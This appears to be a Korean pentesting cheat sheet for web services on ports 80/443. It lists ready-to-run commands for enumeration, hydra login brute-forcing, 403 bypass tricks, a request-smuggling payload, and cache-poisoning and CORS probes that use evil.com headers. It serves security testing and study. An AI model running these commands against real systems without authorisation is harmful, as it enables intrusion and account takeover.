# HTTP/HTTPS (80/443)

웹 서비스. 가장 넓은 공격 표면을 가진 프로토콜. 상세 웹 공격 기법은 [Web 공격](../web/index.md) 참고.

---

## 정보 수집

```bash
# 기술 스택 확인
whatweb http://TARGET
curl -sI http://TARGET

# SSL/TLS 정보
sslscan TARGET
nmap --script ssl-enum-ciphers -p 443 TARGET

# robots.txt, sitemap.xml
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
```

## 디렉토리 / 파일 열거

```bash
# gobuster
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
gobuster dir -u http://TARGET -w wordlist.txt -x php,asp,aspx,jsp,txt,bak,old,config -t 50

# feroxbuster (재귀적)
feroxbuster -u http://TARGET -w wordlist.txt --depth 3

# ffuf
ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302,403 -t 50
```

## 서브도메인 열거

```bash
# DNS 기반
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# VHOST 기반 (Host 헤더)
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE
gobuster vhost -u http://TARGET -w subdomains.txt --append-domain
```

## 파라미터 퍼징

```bash
# GET 파라미터 발견
ffuf -u "http://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs SIZE

# POST 파라미터 발견
ffuf -u http://TARGET/page -X POST -d "FUZZ=test" -w params.txt -fs SIZE
```

---

## 인증 공격

```bash
# 기본 자격 증명 시도
# admin:admin, admin:password, root:root, etc.

# HTTP Basic Auth Brute Force
hydra -l admin -P passwords.txt TARGET http-get /admin

# HTTP POST Form Brute Force
hydra -l admin -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# ffuf로 로그인 Brute Force
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fc 401 -fs SIZE
```

---

## 주요 확인사항

```text
□ 기본 자격 증명 (admin 패널, 관리 콘솔)
□ 디렉토리 열거 (숨겨진 페이지, 백업 파일)
□ 기술 스택 식별 (CMS, 프레임워크, 버전)
□ 소스 코드 내 주석, API 키, 비밀번호
□ .git, .svn, .env, backup 파일 노출
□ API 엔드포인트 발견 및 문서화
□ Cookie, JWT, Session 관리 방식
□ CORS 설정, CSP 헤더
□ HTTP 메서드 (PUT, DELETE, TRACE 등)
□ 에러 페이지 정보 노출
```

---

## Nmap NSE

```bash
nmap --script=http-enum -p 80,443 TARGET
nmap --script=http-headers -p 80,443 TARGET
nmap --script=http-methods --script-args http-methods.url-path='/' -p 80 TARGET
nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 TARGET
nmap --script=http-vuln-* -p 80,443 TARGET
```

---

## HTTP 메서드 / 경로 우회

401/403 응답이 실제 ACL 불일치인지 확인.

```bash
# 메서드 스위치
curl -X POST http://TARGET/admin
curl -X PUT  http://TARGET/admin
curl -X TRACE http://TARGET/admin

# 헤더 기반 IP/내부 경로 스푸핑
for h in 'X-Forwarded-For' 'X-Real-IP' 'X-Originating-IP' 'X-Remote-IP' 'X-Client-IP' 'Forwarded'; do
  curl -s -o /dev/null -w "%{http_code} $h\n" -H "$h: 127.0.0.1" http://TARGET/admin
done

# 경로 우회 트릭
curl -i http://TARGET//admin
curl -i http://TARGET/./admin
curl -i http://TARGET/admin..;/
curl -i http://TARGET/admin%20
curl -i http://TARGET/admin%09
curl -i http://TARGET/admin#
curl -i http://TARGET/admin?

# 자동화
ffuf -u http://TARGET/admin -H "X-Forwarded-For: FUZZ" -w ips.txt -fc 403
# 전용 도구
nuclei -t http/misconfiguration/ -u http://TARGET
```

---

## HTTP Request Smuggling

프론트엔드(CDN/Proxy) 와 백엔드가 `Content-Length` / `Transfer-Encoding` 을 다르게 해석하는 경우.

```bash
# 자동 탐지
smuggler.py -u https://TARGET

# Burp 확장: HTTP Request Smuggler (Turbo Intruder 기반)
# 테스트 유형: CL.TE / TE.CL / TE.TE
```

```http
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

영향: 인증 우회, 다른 사용자 요청 탈취, 내부 경로 접근.

---

## Web Cache Poisoning / Deception

```bash
# Param Miner (Burp 확장) 로 캐시에 영향 미치는 숨은 헤더/파라미터 탐지
# 대표 예: X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL

curl -s -H "X-Forwarded-Host: evil.com" "http://TARGET/?cb=$RANDOM" | grep -oE 'https?://[^"]+'
# 다른 사용자 요청이 poisoned 응답을 받게 됨

# Cache Deception: 정적 파일 경로에 인증 리소스 끼워넣기
curl -i "http://TARGET/profile/me.css"
curl -i "http://TARGET/api/v1/user/me/avatar.jpg"
```

---

## CORS / 헤더 misconfig 빠른 점검

```bash
curl -sI -H "Origin: https://evil.com" http://TARGET/api/me | grep -iE 'access-control|set-cookie'
# Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true → 취약

nuclei -t http/cors/ -u http://TARGET
nuclei -t http/misconfiguration/ -u http://TARGET
```
